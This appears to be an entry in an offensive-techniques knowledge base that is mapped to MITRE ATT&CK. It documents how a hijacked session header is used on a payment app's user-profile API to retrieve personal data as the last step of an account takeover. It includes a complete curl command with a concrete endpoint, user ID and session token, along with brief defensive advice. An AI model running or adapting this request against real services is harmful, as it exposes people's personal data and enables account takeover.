---
tags:
  - pii-exfiltration
  - account-takeover
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/retrieve-user-profile]]'
verified: false
platforms:
  - Mobile
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:30:47.317Z'
sub_techniques: []
id: d05d59ef-bf73-4aa5-8e75-73dc922942ef
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Access-User-Details-via-API

## Summary

This procedure uses the obtained session to query the user profile endpoint, retrieving sensitive PII such as phone, name, address, DOB, and email, completing the account takeover.

## Description

The /api/v2/users/{user_id} GET endpoint requires the Affirm-Client header for authentication. With a valid session, it returns full user details without further checks. This exploits the post-auth access controls. Prerequisites: Session and user_id. Outcome: Exposed PII for takeover.

## Requirements

1. Valid Affirm-Client session header
2. User_id from auth response
3. API access

## Defense

Defensive measures and detection strategies:

- Scope sessions to minimal permissions (e.g., no PII on login-only tokens)
- Log and audit profile access post-login
- Implement data masking or consent checks for PII

## Objectives

1. Retrieve user PII using session
2. Achieve full account takeover
3. Exfiltrate sensitive data

## Instructions

### Step 1: Query User Profile

**Context**: Send GET request with session header to fetch details.

**Command** ([[commands/retrieve-user-profile]]):
```bash
curl -X GET https://hackerone.affirm-odin.com/api/v2/users/1479-5770-XGGL \
  -H "User-Agent: okhttp/3.13.1" \
  -H "Affirm-Client: .eJyrVkrOzytJrSiJTyzKVLJSMjV2Cg80MDMJNwy39HCycFfSUSotTi1SsqpWyslPz8yLL04tLs7Mz8OlvLYWAD8TGa8.EOzRAg.KdnFWXFpkJrsLXazTxNyjxb5Jtk" \
  -H "Affirm-Platform: android" \
  -H "Affirm-User-Agent: Affirm-Android" \
  -H "Affirm-App-Version: 3.62.3" \
  -H "Affirm-App-Version-Code: 312" \
  -H "Affirm-OS-Version: 22"
```

> Expected output: HTTP 200 with JSON including phone_number, name, address, dob, email. Verify no 401 errors.

## MITRE ATT&CK Mapping

### Tactics

- [[Collection]] Collection

### Techniques

- [[Account Discovery]] Account Discovery

### Sub-Techniques


## Commands Used

- [[commands/retrieve-user-profile]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- pii-exfiltration
